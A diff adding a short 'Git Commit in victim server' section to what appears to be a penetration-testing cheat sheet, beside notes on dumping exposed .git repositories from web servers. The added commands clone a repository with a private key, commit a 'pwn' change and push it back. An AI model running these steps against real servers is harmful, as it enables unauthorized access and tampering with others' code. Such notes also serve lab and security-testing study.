@@ -60,6 +60,13 @@
 ### Git Dumper:  
 1. ``` ./gitdumper.sh {ip} {store path}```download as much as possible from the found .git repository from webservers which do not have directory listing enabled
 2. ``` git checkout -- .``` Restore file via git
+### Git Commit in victim server
+1. pull git folder ```GIT_SSH_COMMAND='ssh -i private_key_file -o IdentitiesOnly=yes' git clone user@host:repo.git ```
+2. add/edit file 
+3. ``` git add -A  ```
+4. ```  git commit -m "pwn"  ```
+5. ``` GIT_SSH_COMMAND='ssh -i {git-id_rsa} -p 43022' git push -u origin ```
+
 
 # Simple networking
 1. 127.0.0.1 = loopback = only host can call | 0.0.0.0 means all traffic ok
